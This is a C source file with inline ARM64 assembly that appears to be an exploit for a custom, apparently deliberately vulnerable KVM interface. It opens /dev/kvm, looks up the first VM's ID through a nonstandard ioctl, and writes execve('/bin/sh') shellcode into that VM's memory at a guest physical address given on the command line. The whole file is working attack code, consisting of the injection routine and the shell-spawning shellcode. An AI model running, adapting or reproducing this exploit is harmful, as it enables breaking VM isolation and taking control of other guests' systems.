#include <fcntl.h>
#include <sys/ioctl.h>
#include <linux/kvm.h>

#include <stdint.h>
#include <stdio.h>

struct kvm_arm_write_gpa_args {
	uint32_t vmid;
	uint64_t gpa;
	uint64_t buf;
	uint64_t size;
};

#define KVM_ARM_WRITE_GPA _IOW(KVMIO, 0x0b, struct kvm_arm_write_gpa_args)
#define KVM_ARM_GET_VMID _IOW(KVMIO, 0x0c, unsigned long)

extern void shellcode();
__asm__(".global shellcode\n"
	"shellcode:\n\t"
	/* push b'/bin///sh\x00' */
	/* Set x14 = 8299904519029482031 = 0x732f2f2f6e69622f */
	"mov  x14, #25135\n\t"
	"movk x14, #28265, lsl #16\n\t"
	"movk x14, #12079, lsl #0x20\n\t"
	"movk x14, #29487, lsl #0x30\n\t"
	"mov  x15, #104\n\t"
	"stp x14, x15, [sp, #-16]!\n\t"
	/* execve(path='sp', argv=0, envp=0) */
	"mov  x0, sp\n\t"
	"mov  x1, xzr\n\t"
	"mov  x2, xzr\n\t"
	/* call execve() */
	"mov  x8, #221\n\t" // SYS_execve
	"svc 0");

int main(int argc, char *argv[])
{
	struct kvm_arm_write_gpa_args wgpa = {
		.buf = (unsigned long)&shellcode,
		.size = 44,
	};
	int ret;

	if (argc < 2) {
		printf("Usage: %s gpa\n", argv[0]);
		return 1;
	}
	sscanf(argv[1], "%lx", &wgpa.gpa);

	// O_NONBLOCK to avoid unwanted side effects
	int kvm = open("/dev/kvm", O_RDWR | O_NONBLOCK);
	if (kvm < 0) {
		perror("open kvm fail");
		return kvm;
	}

	// get VMID of the first VM
	ret = ioctl(kvm, KVM_ARM_GET_VMID, 0);
	if (ret < 0) {
		perror("get VMID fail");
		return ret;
	}
	printf("first VMID is %d\n", ret);
	wgpa.vmid = ret;

	// write to VM memory
	printf("&args = %p, vmid = %d, gpa = %lx, size = %ld\n",
	       &wgpa, wgpa.vmid, wgpa.gpa, wgpa.size);
	ret = ioctl(kvm, KVM_ARM_WRITE_GPA, &wgpa);
	if (ret < 0)
		perror("write gPA fail");
	printf("kvm returns %d\n", ret);
}
